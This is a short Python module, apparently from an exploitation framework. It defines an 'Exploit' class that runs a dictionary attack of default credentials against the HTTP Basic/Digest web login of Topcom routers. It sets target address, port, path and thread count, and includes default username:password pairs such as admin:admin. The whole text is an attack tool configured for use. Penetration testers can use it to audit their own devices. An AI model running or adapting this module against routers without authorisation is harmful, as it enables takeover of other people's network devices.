...
class Exploit(HTTPBasicDigestDefault):
    __info__ = {
        "name": "Topcom Router Default Web Interface Creds",
        "description": "Dictionary attack against Topcom Router Web Interface (HTTP Basic/Digest Auth).",
        "authors": ("André Henrique (@mrhenrike) — EmbedXPL-Forge",),
        "devices": ("Topcom Router",),
    }
    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(80, "Target HTTP port")
    path = OptString("/", "Target path")
    threads = OptInteger(8, "Number of threads")
    defaults = OptWordlist("admin:12345678,admin:admin", "User:Pass or file with default credentials (file://)")
